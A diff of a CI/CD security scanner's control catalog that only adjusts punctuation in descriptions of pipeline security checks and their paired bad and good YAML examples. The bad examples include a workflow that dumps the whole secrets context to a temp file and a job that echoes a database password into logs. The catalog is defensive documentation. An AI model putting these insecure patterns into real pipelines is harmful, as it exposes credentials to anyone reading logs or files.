@@ -109,7 +109,7 @@ export const controlCatalog: Record<
       controlDescription:
         "Flags any workflow on the `pull_request_target` trigger that explicitly checks out the PR head (`github.event.pull_request.head.sha` or `head_ref`). That job runs the PR author's code while holding the base repository's secrets and a write-scoped `GITHUB_TOKEN`.",
       controlWhyItMatters:
-        "This is the exact pattern behind the March 2025 tj-actions / reviewdog compromise: any step after the head checkout — `npm install`, `pytest`, even reading attacker-supplied files — becomes a direct secret-exfiltration path. Prefer the `pull_request` trigger (no secret access on fork PRs), or hand untrusted code to a separate `workflow_run` job that never checks it out.",
+        "This is the exact pattern behind the March 2025 tj-actions / reviewdog compromise: any step after the head checkout, whether `npm install`, `pytest`, or even reading attacker-supplied files, becomes a direct secret-exfiltration path. Prefer the `pull_request` trigger (no secret access on fork PRs), or hand untrusted code to a separate `workflow_run` job that never checks it out.",
     },
   },
   containerImageMustComeFromAuthorizedSources: {
@@ -167,7 +167,7 @@ export const controlCatalog: Record<
     },
     github: {
       controlDescription:
-        "Scans every file under `.github/workflows/` with [gitleaks](https://gitleaks.io). Each high-confidence match becomes a Critical finding carrying only a redacted preview of the secret \u2014 the raw value is replaced in the collector before any output sees it.",
+        "Scans every file under `.github/workflows/` with [gitleaks](https://gitleaks.io). Each high-confidence match becomes a Critical finding carrying only a redacted preview of the secret; the raw value is replaced in the collector before any output sees it.",
       controlWhyItMatters:
         "GitHub repositories are public-by-default for many open-source projects, and even private repos are visible to every collaborator and fork. A token committed to a workflow leaks the moment the file is pushed; rotation is the only fix. Opt-in because gitleaks is an external dependency.",
     },
@@ -275,7 +275,7 @@ export const controlCatalog: Record<
       controlDescription:
         "Detects security scanning jobs neutralized by `continue-on-error: true`, narrow `if:` conditions, or always-skip triggers.",
       controlWhyItMatters:
-        "Same OWASP CICD-SEC-4 pattern as on GitLab \u2014 a green pipeline that secretly skipped its security scan is worse than no scan.",
+        "Same OWASP CICD-SEC-4 pattern as on GitLab: a green pipeline that secretly skipped its security scan is worse than no scan.",
     },
   },
   pipelineMustNotExecuteUnverifiedScripts: {
@@ -429,7 +429,7 @@ export const controlCatalog: Record<
       controlDescription:
         "Flags callers that pass `secrets: inherit` instead of declaring the secrets the callee needs.",
       controlWhyItMatters:
-        "Inheriting hands every caller secret to the reusable workflow \u2014 a third-party reusable workflow then sees secrets it should never see.",
+        "Inheriting hands every caller secret to the reusable workflow, so a third-party reusable workflow sees secrets it should never see.",
     },
   },
   workflowsMustDeclarePermissions: {
@@ -508,7 +508,7 @@ export const issues: Record<string, IssueDoc> = {
         "Untrusted image sources can introduce malicious code into your pipeline. For instance, a malicious image can steal your API tokens, your source code, and even alter it.",
       remediation:
         "Replace the container image with an image coming from a source declared as trusted in your Policy controls.",
-      badExample: `# .gitlab-ci.yml — ❌ Images from untrusted registries
+      badExample: `# .gitlab-ci.yml: ❌ Images from untrusted registries
 security-scan:
   image: untrusted-registry.example.com/scanner:2.0
   script:
@@ -519,7 +519,7 @@ sast:
   script:
     - sast-scan .`,
       badExampleCaption: "Images from unknown registries could be compromised.",
-      goodExample: `# .gitlab-ci.yml — ✅ Images from authorized registries
+      goodExample: `# .gitlab-ci.yml: ✅ Images from authorized registries
 security-scan:
   image: registry.gitlab.com/security-products/secrets:7
   script:
@@ -530,7 +530,7 @@ sast:
   script:
     - sast-scan .
 
-# .plumber.yaml — Authorized sources configuration
+# .plumber.yaml: Authorized sources configuration
 # containerImageMustComeFromAuthorizedSources:
 #   enabled: true
 #   trustDockerHubOfficialImages: true
@@ -556,10 +556,10 @@ sast:
       description:
         "A workflow job runs in a container or service image pulled from a registry that is not in your trusted-sources list.",
       impact:
-        "An untrusted registry can serve a backdoored image. Once the runner pulls it, the image executes inside the job with access to whichever secrets the job uses — `GITHUB_TOKEN`, deploy keys, AWS credentials.",
+        "An untrusted registry can serve a backdoored image. Once the runner pulls it, the image executes inside the job with access to whichever secrets the job uses: `GITHUB_TOKEN`, deploy keys, AWS credentials.",
       remediation:
         "Replace the image with one from a registry declared as trusted in `.plumber.yaml`. For public images, prefer `ghcr.io/owner/...` (where `owner` is a vetted organisation) or Docker Hub Official Images.",
-      badExample: `# .github/workflows/test.yml — ❌ Untrusted registries
+      badExample: `# .github/workflows/test.yml: ❌ Untrusted registries
 name: test
 on: [push]
 jobs:
@@ -577,7 +577,7 @@ jobs:
     steps:
       - run: pytest`,
       badExampleCaption: "Both the container image and the service image come from registries not in the trusted-source list.",
-      goodExample: `# .github/workflows/test.yml — ✅ Trusted registries only
+      goodExample: `# .github/workflows/test.yml: ✅ Trusted registries only
 name: test
 on: [push]
 jobs:
@@ -595,7 +595,7 @@ jobs:
     steps:
       - run: pytest
 
-# .plumber.yaml — Authorized sources configuration
+# .plumber.yaml: Authorized sources configuration
 github:
   controls:
     containerImageMustComeFromAuthorizedSources:
@@ -629,7 +629,7 @@ github:
         "Using forbidden tags can result in insecure containers running in your CI/CD pipelines or unexpected breaking changes. For instance, if your pipeline uses the `latest` tag, it might pull a compromised, untested, or breaking image.",
       remediation:
         "Update the image tag to a tag allowed by your Policy controls.",
-      badExample: `# .gitlab-ci.yml — ❌ Uses "latest" tag (forbidden)
+      badExample: `# .gitlab-ci.yml: ❌ Uses "latest" tag (forbidden)
 build:
   image: python:latest
   script:
@@ -641,7 +641,7 @@ lint:
   script:
     - golangci-lint run`,
       badExampleCaption: "These jobs use the `latest` tag, which is mutable and may change unexpectedly.",
-      goodExample: `# .gitlab-ci.yml — ✅ Uses specific version tags
+      goodExample: `# .gitlab-ci.yml: ✅ Uses specific version tags
 build:
   image: python:3.12.1
   script:
@@ -669,10 +669,10 @@ lint:
       description:
         "A workflow runs against a container image referenced by a forbidden tag (e.g. `latest`, `dev`, `main`).",
       impact:
-        "Mutable tags can move between runs. A `latest` tag that passed today's job might point at a different image tomorrow — including a compromised one — without any change to the workflow file.",
+        "Mutable tags can move between runs. A `latest` tag that passed today's job might point at a different image tomorrow, including a compromised one, without any change to the workflow file.",
       remediation:
         "Pin the image to an immutable version tag, or better yet to a digest (see ISSUE-103).",
-      badExample: `# .github/workflows/build.yml — ❌ Uses "latest"
+      badExample: `# .github/workflows/build.yml: ❌ Uses "latest"
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -680,8 +680,8 @@ jobs:
       image: node:latest
     steps:
       - run: npm ci && npm test`,
-      badExampleCaption: "`latest` is mutable — the image can change underneath you.",
-      goodExample: `# .github/workflows/build.yml — ✅ Specific version
+      badExampleCaption: "`latest` is mutable, so the image can change underneath you.",
+      goodExample: `# .github/workflows/build.yml: ✅ Specific version
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -721,7 +721,7 @@ github:
         "Unauthorized users can exploit unprotected variables, leading to potential security breaches. For example, if your deployment key is exposed on an unprotected branch, it could be used to deploy malicious code by a member with a low role on the project.",
       remediation:
         "Protect sensitive CI/CD variables to restrict their usage only to protected branches or tags.",
-      badExample: `# GitLab project settings — ❌ Variable not protected
+      badExample: `# GitLab project settings: ❌ Variable not protected
 # Settings > CI/CD > Variables:
 #
 #   Key:       DEPLOY_KEY
@@ -733,7 +733,7 @@ github:
 # those triggered by untrusted branches or members with
 # low roles (e.g., Reporter, Developer).`,
       badExampleCaption: "The DEPLOY_KEY variable is not protected and can be used on any branch.",
-      goodExample: `# GitLab project settings — ✅ Variable protected
+      goodExample: `# GitLab project settings: ✅ Variable protected
 # Settings > CI/CD > Variables:
 #
 #   Key:       DEPLOY_KEY
@@ -766,7 +766,7 @@ github:
         "Exposed variable values can result in unauthorized access to your sensitive data. For instance, if your database password is visible in logs, it can be exploited to gain direct database access.",
       remediation:
         "Mask the CI/CD variable to hide its value in logs.",
-      badExample: `# GitLab project settings — ❌ Variable not masked
+      badExample: `# GitLab project settings: ❌ Variable not masked
 # Settings > CI/CD > Variables:
 #
 #   Key:    DATABASE_PASSWORD
@@ -777,7 +777,7 @@ github:
 #   $ echo $DATABASE_PASSWORD
 #   MySecretP@ssw0rd!`,
       badExampleCaption: "The unmasked variable value appears in plain text in job logs.",
-      goodExample: `# GitLab project settings — ✅ Variable masked
+      goodExample: `# GitLab project settings: ✅ Variable masked
 # Settings > CI/CD > Variables:
 #
 #   Key:    DATABASE_PASSWORD
@@ -809,12 +809,12 @@ github:
       controlName: "Workflows must not export the entire secrets context",
       controlConfigKey: "workflowMustNotExportEntireSecretsContext",
       description:
-        "A GitHub Actions workflow serialises the whole `secrets` context with `toJson(secrets)` or `toJSON(secrets)` and pipes the result into a step's environment, `run:` script, or `with:` input. The resulting string contains every secret the job has access to — repository, organisation and environment — and travels through whatever downstream consumer the step passes it to (a third-party action, a remote server, a log line). Even with GitHub's automatic log redaction, a single `echo` of the JSON payload has been enough to leak tokens in past supply-chain incidents; a compromised reusable action sees them directly regardless of logging.",
+        "A GitHub Actions workflow serialises the whole `secrets` context with `toJson(secrets)` or `toJSON(secrets)` and pipes the result into a step's environment, `run:` script, or `with:` input. The resulting string contains every secret the job has access to (repository, organisation and environment) and travels through whatever downstream consumer the step passes it to (a third-party action, a remote server, a log line). Even with GitHub's automatic log redaction, a single `echo` of the JSON payload has been enough to leak tokens in past supply-chain incidents; a compromised reusable action sees them directly regardless of logging.",
       impact:
-        "GitHub's redactor masks known secret *strings* in logs. A `toJson(secrets)` dump produces a single JSON value containing every secret as a substring of a larger string; the redactor does not recognise the wrapping and the secrets leak verbatim. The risk compounds when the dump is forwarded to anything outside GitHub's runtime — a curl, a docker run, a scratch file picked up by an artifact upload.",
+        "GitHub's redactor masks known secret *strings* in logs. A `toJson(secrets)` dump produces a single JSON value containing every secret as a substring of a larger string; the redactor does not recognise the wrapping and the secrets leak verbatim. The risk compounds when the dump is forwarded to anything outside GitHub's runtime: a curl, a docker run, a scratch file picked up by an artifact upload.",
       remediation:
         "Pass only the specific secrets the step needs, by name: `env: { TOKEN: ${{ secrets.NPM_TOKEN }} }`. If the step forwards credentials to a reusable workflow, name each one in the `secrets:` block of the call rather than using `toJson(secrets)` or `secrets: inherit`.",
-      badExample: `# .github/workflows/deploy.yml — ❌ Aggregated secrets dump
+      badExample: `# .github/workflows/deploy.yml: ❌ Aggregated secrets dump
 jobs:
   deploy:
     runs-on: ubuntu-latest
@@ -823,7 +823,7 @@ jobs:
           ALL_SECRETS: \${{ toJson(secrets) }}
         run: echo "$ALL_SECRETS" > /tmp/sec.json && ./debug.sh /tmp/sec.json`,
       badExampleCaption: "The aggregated JSON appears unredacted in logs and on disk.",
-      goodExample: `# .github/workflows/deploy.yml — ✅ Scoped per-secret
+      goodExample: `# .github/workflows/deploy.yml: ✅ Scoped per-secret
 jobs:
   deploy:
     runs-on: ubuntu-latest
@@ -840,7 +840,7 @@ github:
       enabled: true`,
       goodExampleCaption: "Each secret stays a separate, redactable string.",
       tips: [
-        "Same shape as ISSUE-213 (github-context dump) but with secrets — and therefore one severity higher.",
+        "Same shape as ISSUE-213 (github-context dump) but with secrets, so it is one severity higher.",
         "If you genuinely need to enumerate secrets (rare), do it inside an `environment:` with a required reviewer and revoke afterward.",
       ],
       status: "roadmap",
@@ -859,12 +859,12 @@ github:
       controlName: "Pipeline must not leak secrets in configuration",
       controlConfigKey: "pipelineMustNotLeakSecretsInConfig",
       description:
-        "The resolved pipeline configuration contains a pattern that matches a hardcoded secret (API token, private key, password, or other credential) embedded directly in the YAML. Plumber resolves the full merged `.gitlab-ci.yml` (with every `include:` followed) and pipes the result through [gitleaks](https://gitleaks.io); any high-confidence match against the built-in rule catalog — or a custom rule set provided via `gitleaksConfigPath` — surfaces as an ISSUE-301 finding. The detected value never leaves the scanner: each finding's `preview` carries a redacted form with the first and last four characters visible and the middle replaced with asterisks.",
+        "The resolved pipeline configuration contains a pattern that matches a hardcoded secret (API token, private key, password, or other credential) embedded directly in the YAML. Plumber resolves the full merged `.gitlab-ci.yml` (with every `include:` followed) and pipes the result through [gitleaks](https://gitleaks.io); any high-confidence match against the built-in rule catalog (or a custom rule set provided via `gitleaksConfigPath`) surfaces as an ISSUE-301 finding. The detected value never leaves the scanner: each finding's `preview` carries a redacted form with the first and last four characters visible and the middle replaced with asterisks.",
       impact:
         "Secrets committed to pipeline configuration are exposed to everyone with read access to the repository, appear in version history forever (rotation is the only fix, not deletion), and are forwarded to every runner that executes the pipeline. A leaked API key can enable unauthorised access to cloud services, data exfiltration, billing abuse, or lateral movement into production systems.",
       remediation:
         "Revoke and rotate the exposed secret immediately. Remove it from the YAML, then inject it securely as a masked, protected CI/CD variable (`Settings > CI/CD > Variables`) and reference it as `$MY_SECRET` in the pipeline. For production workloads, prefer an external secrets manager (HashiCorp Vault, AWS Secrets Manager, Doppler) over GitLab-managed variables.",
-      badExample: `# .gitlab-ci.yml — ❌ Hardcoded secrets (CRITICAL)
+      badExample: `# .gitlab-ci.yml: ❌ Hardcoded secrets (CRITICAL)
 deploy:
   stage: deploy
   script:
@@ -878,7 +878,7 @@ api-call:
   script:
     - curl -H "Authorization: token $API_TOKEN" https://api.example.com`,
       badExampleCaption: "Secrets hardcoded in .gitlab-ci.yml are visible to every project member and live in the commit history forever.",
-      goodExample: `# .gitlab-ci.yml — ✅ Secrets injected via CI/CD variables
+      goodExample: `# .gitlab-ci.yml: ✅ Secrets injected via CI/CD variables
 deploy:
   stage: deploy
   script:
@@ -903,7 +903,7 @@ gitlab:
       goodExampleCaption: "Secrets stay in protected variables; the YAML is safe to share.",
       tips: [
         "Detection is opt-in: the control requires [gitleaks](https://github.com/gitleaks/gitleaks) on `$PATH` (or set `gitleaksPath`). If the binary is missing, plumber emits a warning and the control routes through the SKIPPED lane rather than failing the run or silently passing.",
-        "If a secret was ever committed, treat it as compromised and rotate it immediately — deletion does not remove it from history.",
+        "If a secret was ever committed, treat it as compromised and rotate it immediately; deletion does not remove it from history.",
         "Use a custom `.gitleaks.toml` via `gitleaksConfigPath` to narrow rules to your stack, or to allowlist legitimate matches (e.g. dummy values in test pipelines).",
         "Pair with pre-commit hooks (`gitleaks protect --staged`) so the next leak is caught before it lands in git.",
       ],
@@ -919,12 +919,12 @@ gitlab:
       controlName: "Workflow must not leak secrets in configuration",
       controlConfigKey: "pipelineMustNotLeakSecretsInConfig",
       description:
-        "A file under `.github/workflows/` contains a pattern that matches a hardcoded secret (API token, private key, password, or other credential) embedded directly in the YAML. Plumber pipes every workflow file through [gitleaks](https://gitleaks.io); any high-confidence match against the built-in rule catalog — or a custom rule set provided via `gitleaksConfigPath` — surfaces as an ISSUE-301 finding. The detected value never leaves the scanner: each finding's `preview` carries a redacted form with the first and last four characters visible and the middle replaced with asterisks.",
+        "A file under `.github/workflows/` contains a pattern that matches a hardcoded secret (API token, private key, password, or other credential) embedded directly in the YAML. Plumber pipes every workflow file through [gitleaks](https://gitleaks.io); any high-confidence match against the built-in rule catalog (or a custom rule set provided via `gitleaksConfigPath`) surfaces as an ISSUE-301 finding. The detected value never leaves the scanner: each finding's `preview` carries a redacted form with the first and last four characters visible and the middle replaced with asterisks.",
       impact:
         "Secrets committed to workflow files are exposed to every collaborator, every fork, and the entire commit history. Public repositories make the leak instantly indexable by attacker tooling; private repositories still expose it to every member of the org and every workflow that runs against the repo. Rotation is the only fix.",
       remediation:
         "Revoke and rotate the exposed secret immediately. Remove the literal from the workflow YAML, then inject it via repository or environment secrets and reference it as `${{ secrets.MY_SECRET }}`. Scope the reference to the smallest step that needs it; avoid passing it through job-level `env:` if a single step suffices.",
-      badExample: `# .github/workflows/release.yml — ❌ Hardcoded token (CRITICAL)
+      badExample: `# .github/workflows/release.yml: ❌ Hardcoded token (CRITICAL)
 jobs:
   publish:
     runs-on: ubuntu-latest
@@ -934,7 +934,7 @@ jobs:
     steps:
       - run: ./scripts/publish.sh`,
       badExampleCaption: "The Slack and Stripe tokens are visible to every member, fork and CI run touching this workflow.",
-      goodExample: `# .github/workflows/release.yml — ✅ Repository / environment secrets
+      goodExample: `# .github/workflows/release.yml: ✅ Repository / environment secrets
 jobs:
   publish:
     runs-on: ubuntu-latest
@@ -957,7 +957,7 @@ github:
       goodExampleCaption: "Each secret stays inside GitHub's vault and is masked in logs.",
       tips: [
         "Detection is opt-in: the control requires [gitleaks](https://github.com/gitleaks/gitleaks) on `$PATH` (or set `gitleaksPath`). When the binary is missing or the scan fails, plumber emits a warning and routes the control through the SKIPPED lane rather than silently passing.",
-        "Public repos are scanned by gitleaks-as-a-service on every push by GitHub itself, but that is detection-after-the-fact — this control catches the leak before it merges.",
+        "Public repos are scanned by gitleaks-as-a-service on every push by GitHub itself, but that is detection after the fact. This control catches the leak before it merges.",
         "Use a custom `.gitleaks.toml` via `gitleaksConfigPath` to allowlist synthetic test values (the slack/stripe patterns in plumber's own scenario battery are deliberately allowed in a local scratch config).",
         "Pair with pre-commit hooks (`gitleaks protect --staged`) and GitHub's push-protection rules so the next leak is caught before it lands on a branch.",
       ],
@@ -981,7 +981,7 @@ github:
         "Hardcoded jobs make pipelines harder to maintain and adapt to changes. Moreover, they introduce a risk of being non-compliant with the organization's standards. For instance, if your security check job is hardcoded, you might miss the organization's security standards checks.",
       remediation:
         "Replace the hardcoded job in the project CI/CD configuration with a template or component inclusion.",
-      badExample: `# .gitlab-ci.yml — ❌ Jobs defined directly (hardcoded)
+      badExample: `# .gitlab-ci.yml: ❌ Jobs defined directly (hardcoded)
 stages:
   - test
   - build
@@ -1000,8 +1000,8 @@ build:
   script:
     - docker build -t $CI_REGISTRY_IMAGE .
     - docker push $CI_REGISTRY_IMAGE`,
-      badExampleCaption: "All jobs are hardcoded — no reuse, no governance.",
-      goodExample: `# .gitlab-ci.yml — ✅ Jobs from CI/CD components and includes
+      badExampleCaption: "All jobs are hardcoded: no reuse, no governance.",
+      goodExample: `# .gitlab-ci.yml: ✅ Jobs from CI/CD components and includes
 include:
   # CI/CD Component from the catalog
   - component: gitlab.com/components/sast/sast@1.2.0
@@ -1022,7 +1022,7 @@ variables:
       tips: [
         "Browse the [GitLab CI/CD Catalog](https://gitlab.com/explore/catalog) for reusable components.",
         "Create shared templates in a dedicated project for organization-specific jobs.",
-        "Some project-specific jobs may be acceptable — discuss with your team what should be centralized.",
+        "Some project-specific jobs may be acceptable. Discuss with your team what should be centralized.",
       ],
       relatedCodes: ["ISSUE-403", "ISSUE-404"],
     },
@@ -1043,7 +1043,7 @@ variables:
         "Outdated templates may have known vulnerabilities or lack compliance with current standards. For example, if your security scan template is outdated, it might miss detecting recent threats.",
       remediation:
         "Update the template in your project CI/CD configuration file to the latest version to ensure security and compliance.",
-      badExample: `# .gitlab-ci.yml — ❌ Uses outdated version
+      badExample: `# .gitlab-ci.yml: ❌ Uses outdated version
 include:
   - component: gitlab.com/components/sast/sast@1.0.0
     # Latest available: 1.5.2
@@ -1051,7 +1051,7 @@ include:
   - component: gitlab.com/components/secret-detection/secret-detection@2.1.0
     # Latest available: 2.4.1`,
       badExampleCaption: "Components are several versions behind the latest release.",
-      goodExample: `# .gitlab-ci.yml — ✅ Uses latest versions
+      goodExample: `# .gitlab-ci.yml: ✅ Uses latest versions
 include:
   - component: gitlab.com/components/sast/sast@1.5.2
 
@@ -1081,7 +1081,7 @@ include:
         "Using forbidden tags can result in insecure templates running in your CI/CD pipelines or unexpected breaking changes. For instance, if you include a template using the `main` version (default branch of the source repository), it might pull a compromised, untested, or breaking template.",
       remediation:
         "Update the template include version to a version allowed by your Policy controls.",
-      badExample: `# .gitlab-ci.yml — ❌ Uses forbidden version references
+      badExample: `# .gitlab-ci.yml: ❌ Uses forbidden version references
 include:
   - component: gitlab.com/components/sast/sast@latest
 
@@ -1091,7 +1091,7 @@ include:
 
   - component: gitlab.com/my-org/custom-scanner/scan@HEAD`,
       badExampleCaption: "`latest`, `main`, and `HEAD` are mutable and forbidden.",
-      goodExample: `# .gitlab-ci.yml — ✅ Uses specific version tags
+      goodExample: `# .gitlab-ci.yml: ✅ Uses specific version tags
 include:
   - component: gitlab.com/components/sast/sast@1.5.2
 
@@ -1125,7 +1125,7 @@ include:
         "Missing templates result in non-compliant and insecure pipeline configurations. For example, if your pipeline is missing a security scan template, vulnerabilities might go undetected.",
       remediation:
         "Include the missing template in the CI/CD pipeline configuration of the project.",
-      badExample: `# .gitlab-ci.yml — ❌ Missing required template
+      badExample: `# .gitlab-ci.yml: ❌ Missing required template
 include:
   - project: my-org/ci-templates
     ref: v2.1.0
@@ -1137,7 +1137,7 @@ include:
 #   enabled: true
 #   required: templates/build AND templates/security`,
       badExampleCaption: "The security template is required but not included.",
-      goodExample: `# .gitlab-ci.yml — ✅ All required templates included
+      goodExample: `# .gitlab-ci.yml: ✅ All required templates included
 include:
   - project: my-org/ci-templates
     ref: v2.1.0
@@ -1170,7 +1170,7 @@ include:
         "Overriding required templates can lead to non-compliant and insecure pipelines. For example, overriding a SAST template might bypass mandatory checks.",
       remediation:
         "Remove overrides from the project CI/CD configuration. If overrides are relevant, include them in the required template or create a new one.",
-      badExample: `# .gitlab-ci.yml — ❌ Overrides required template job
+      badExample: `# .gitlab-ci.yml: ❌ Overrides required template job
 include:
   - project: my-org/ci-templates
     ref: v2.1.0
@@ -1182,13 +1182,13 @@ security-scan:
     - echo "Security scan disabled for speed"
   when: manual`,
       badExampleCaption: "The template's security-scan job is overridden and made manual.",
-      goodExample: `# .gitlab-ci.yml — ✅ Template included without overrides
+      goodExample: `# .gitlab-ci.yml: ✅ Template included without overrides
 include:
   - project: my-org/ci-templates
     ref: v2.1.0
     file: /templates/security.yml
 
-# No local overrides — template jobs run as designed
+# No local overrides: template jobs run as designed
 # Use variables for customization:
 variables:
   SECURITY_SCAN_LEVEL: "high"`,
@@ -1217,7 +1217,7 @@ variables:
         "Unprotected branches are highly vulnerable to unauthorized modifications. For instance, any member can push malicious code directly to your production branch without any review or validation.",
       remediation:
         "Enable branch protection on the branch to restrict changes to authorized users only.",
-      badExample: `# GitLab project settings — ❌ Branch not protected
+      badExample: `# GitLab project settings: ❌ Branch not protected
 # Branch "main" has no protection rules
 # Anyone with Developer access can:
 #   - Push directly
@@ -1232,7 +1232,7 @@ branchMustBeProtected:
     - main
     - release/*`,
       badExampleCaption: "The `main` branch has no protection, violating the policy.",
-      goodExample: `# GitLab project settings — ✅ Branch properly protected
+      goodExample: `# GitLab project settings: ✅ Branch properly protected
 # Settings > Repository > Protected Branches:
 #
 #   Branch: main
@@ -1273,7 +1273,7 @@ branchMustBeProtected:
         "Without protection on the matching branches, anyone with write access can push directly, force-push, rewrite history, or delete the branch. Required reviews, code-owner approvals, and status checks are all bypassed.",
       remediation:
         "Add protection through either mechanism. Classic Branch Protection lives under Settings > Branches; Repository Rulesets live under Settings > Rules > Rulesets (rulesets inherited from the organization count too). Plumber merges all sources, stricter wins, so a rule defined in one mechanism contributes to the effective configuration even if the other has nothing for the same branch.",
-      badExample: `# GitHub repo settings — ❌ No protection on \`main\`
+      badExample: `# GitHub repo settings: ❌ No protection on \`main\`
 # Settings > Rules > Rulesets:
 #   (no ruleset targeting \`main\`)
 #
@@ -1291,7 +1291,7 @@ github:
       allowForcePush: false
       requirePullRequestReviews: true`,
       badExampleCaption: "`main` has no ruleset; the protection policy is not satisfied.",
-      goodExample: `# GitHub repo settings — ✅ Ruleset enforces review + no force-push
+      goodExample: `# GitHub repo settings: ✅ Ruleset enforces review + no force-push
 # Settings > Rules > Rulesets > New branch ruleset:
 #   Target: main
 #   Rules:
@@ -1331,14 +1331,14 @@ github:
         "Without a security policy source, your project may become non-compliant and vulnerable to risks. For example, if your project lacks a defined security policy source, critical checks might not be enforced.",
       remediation:
         "Define the security policy source as defined in your Policy controls on the project to ensure compliance and security.",
-      badExample: `# GitLab project settings — ❌ No security policy source
+      badExample: `# GitLab project settings: ❌ No security policy source
 # Secure > Security configuration > Security policy project:
 #   (none)
 #
 # The project has no linked security policy project, meaning
 # no security policies are enforced on this project.`,
       badExampleCaption: "No security policy project is linked to this GitLab project.",
-      goodExample: `# GitLab project settings — ✅ Security policy source configured
+      goodExample: `# GitLab project settings: ✅ Security policy source configured
 # Secure > Security configuration > Security policy project:
 #   my-org/security-policies
 #
@@ -1370,7 +1370,7 @@ github:
         "Filename-as-display-name makes review and incident response harder: `test.yml`, `ci.yml` and `build.yml` all blur together in the Actions UI. Branch protection's `Required status checks` keys off the resolved name, so renames here trip CI in surprising ways.",
       remediation:
         "Add a top-level `name:` field describing the workflow.",
-      badExample: `# .github/workflows/test.yml — ❌ No name
+      badExample: `# .github/workflows/test.yml: ❌ No name
 on: [push, pull_request]
 jobs:
   test:
@@ -1378,7 +1378,7 @@ jobs:
     steps:
       - run: pytest`,
       badExampleCaption: "UI shows 'test.yml' (filename) instead of a meaningful label.",
-      goodExample: `# .github/workflows/test.yml — ✅ Named
+      goodExample: `# .github/workflows/test.yml: ✅ Named
 name: Unit tests
 on: [push, pull_request]
 jobs:
@@ -1388,7 +1388,7 @@ jobs:
       - run: pytest`,
       goodExampleCaption: "UI shows 'Unit tests'; status checks reference that name.",
       tips: [
-        "Keep the name short and stable — branch protection rules reference it by exact string match.",
+        "Keep the name short and stable, because branch protection rules reference it by exact string match.",
       ],
       status: "roadmap",
       relatedCodes: [],
@@ -1411,14 +1411,14 @@ jobs:
         "Having insufficient approvals can lead to unreviewed code being merged, increasing the risk of introducing bugs, security vulnerabilities, or non-compliant changes.",
       remediation:
         "Increase the minimum number of approvals required in the merge request approval rule to meet or exceed the minimum number required by your Policy controls.",
-      badExample: `# GitLab project settings — ❌ Insufficient approvals
+      badExample: `# GitLab project settings: ❌ Insufficient approvals
 # Settings > Merge requests > Approval rules:
 #
 #   Rule name: Security Team
 #   Eligible approvers: Security Team (5 members)
 #   Approvals required: 1   ← Below minimum (2 required by policy)`,
       badExampleCaption: "The approval rule requires only 1 approval, but the policy requires at least 2.",
-      goodExample: `# GitLab project settings — ✅ Sufficient approvals configured
+      goodExample: `# GitLab project settings: ✅ Sufficient approvals configured
 # Settings > Merge requests > Approval rules:
 #
 #   Rule name: Security Team
@@ -1450,7 +1450,7 @@ jobs:
         "Non-compliance with approval settings may lead to unreviewed code being merged, increasing the risk of introducing bugs, security vulnerabilities, or non-compliant changes.",
       remediation:
         "Update the merge request approval settings of the project to ensure compliance with your Policy controls.",
-      badExample: `# GitLab project settings — ❌ Non-compliant approval settings
+      badExample: `# GitLab project settings: ❌ Non-compliant approval settings
 # Settings > Merge requests > Approvals:
 #
 #   Prevent approval by author:                  false ← Author can approve own MR
@@ -1460,7 +1460,7 @@ jobs:
 # These settings allow the MR author to approve their own changes,
 # and approvals remain valid even after new commits are pushed.`,
       badExampleCaption: "Approval settings allow the author to approve their own MR and don't reset on new commits.",
-      goodExample: `# GitLab project settings — ✅ Compliant approval settings
+      goodExample: `# GitLab project settings: ✅ Compliant approval settings
 # Settings > Merge requests > Approvals:
 #
 #   Prevent approval by author:                  true
@@ -1492,7 +1492,7 @@ jobs:
         "Without at least one approval rule for protected branches, they lack the necessary review process, increasing the likelihood of unauthorized or insecure changes being merged.",
       remediation:
         "Create a merge request approval rule in the project that covers all protected branches.",
-      badExample: `# GitLab project settings — ❌ No approval rule for all branches
+      badExample: `# GitLab project settings: ❌ No approval rule for all branches
 # Settings > Merge requests > Approval rules:
 #
 #   Rule: "QA Team"  → applies to: main
@@ -1500,8 +1500,8 @@ jobs:
 #
 # There is no rule that applies to ALL protected branches.
 # Branches like release/* have no approval requirement.`,
-      badExampleCaption: "No approval rule covers all protected branches — some branches can be merged without review.",
-      goodExample: `# GitLab project settings — ✅ Approval rule covers all protected branches
+      badExampleCaption: "No approval rule covers all protected branches, so some branches can be merged without review.",
+      goodExample: `# GitLab project settings: ✅ Approval rule covers all protected branches
 # Settings > Merge requests > Approval rules:
 #
 #   Rule: "All Approvals" → applies to: All protected branches
@@ -1533,7 +1533,7 @@ jobs:
         "Missing actions in the pipeline can lead to unverified code being deployed. This increases the risk of security vulnerabilities, compliance issues, and software defects reaching production. For example, if security checks are absent, a vulnerable application can be deployed in production and lead to user data leak.",
       remediation:
         "Ensure that the CI pipeline includes all required validations as defined in your Policy controls.",
-      badExample: `# .gitlab-ci.yml — ❌ Missing required pipeline phases
+      badExample: `# .gitlab-ci.yml: ❌ Missing required pipeline phases
 stages:
   - build
   - deploy
@@ -1550,7 +1550,7 @@ deploy:
     - kubectl apply -f k8s/
   # Deploying without testing or security scanning!`,
       badExampleCaption: "The pipeline skips required test and security scan phases.",
-      goodExample: `# .gitlab-ci.yml — ✅ All required phases present
+      goodExample: `# .gitlab-ci.yml: ✅ All required phases present
 stages:
   - build
   - test
@@ -1599,7 +1599,7 @@ deploy:
         "Non-compliant branch protection settings can lead to unauthorized code changes, security vulnerabilities, and compliance issues. This includes risks such as loss of commit history through force push, unauthorized code merges, and direct pushes to protected branches without proper validation.",
       remediation:
         "Update the branch protection settings to comply with your Policy controls requirements by enforcing proper access controls, disabling force push, and requiring code owner approvals for all changes.",
-      badExample: `# GitLab settings — ❌ Protection exists but is too permissive
+      badExample: `# GitLab settings: ❌ Protection exists but is too permissive
 # Branch: main
 #   Allowed to push: Developers + Maintainers  (too permissive)
 #   Allow force push: Yes                       (dangerous)
@@ -1610,7 +1610,7 @@ deploy:
 #   allowForcePush: false
 #   codeOwnerApprovalRequired: true`,
       badExampleCaption: "Branch is protected but settings don't meet requirements.",
-      goodExample: `# GitLab settings — ✅ Protection meets requirements
+      goodExample: `# GitLab settings: ✅ Protection meets requirements
 # Branch: main
 #   Allowed to merge: Developers + Maintainers
 #   Allowed to push: Maintainers only
@@ -1626,7 +1626,7 @@ branchMustBeProtected:
   minPushAccessLevel: 40`,
       goodExampleCaption: "Branch protection meets all configured requirements.",
       tips: [
-        "Plumber checks each setting independently — the output shows exactly which settings are non-compliant.",
+        "Plumber checks each setting independently; the output shows exactly which settings are non-compliant.",
